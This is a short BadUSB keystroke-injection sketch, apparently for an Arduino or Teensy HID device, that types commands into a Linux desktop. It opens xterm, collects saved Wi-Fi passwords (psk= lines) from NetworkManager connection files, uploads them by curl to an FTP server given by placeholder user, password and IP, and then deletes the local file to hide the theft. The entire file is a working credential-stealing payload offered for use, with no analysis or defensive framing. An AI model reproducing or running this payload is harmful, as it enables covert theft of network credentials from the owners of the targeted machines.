#include "exfil.h"
#include "phukd.h"

void payload() {
  delay(2000);
  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.press(KEY_F2);
  delay(100);
  Keyboard.releaseAll();
  delay(1000);
  Keyboard.println("xterm");
  delay(3000);
  Keyboard.println("cd /etc/NetworkManager/system-connections; grep psk= *|paste -sd,>~/capture.txt; cd ~; export xfile='capture.txt'; export ftpuser='USERNAME'; export ftppass='PASSWORD'; export xip='IPSERVERFTP'");
  delay(3000);
  Keyboard.println("curl -T ${xfile} ftp://${ftpuser}:${ftppass}@${xip}/${xfile}; rm capture.txt; exit");
}
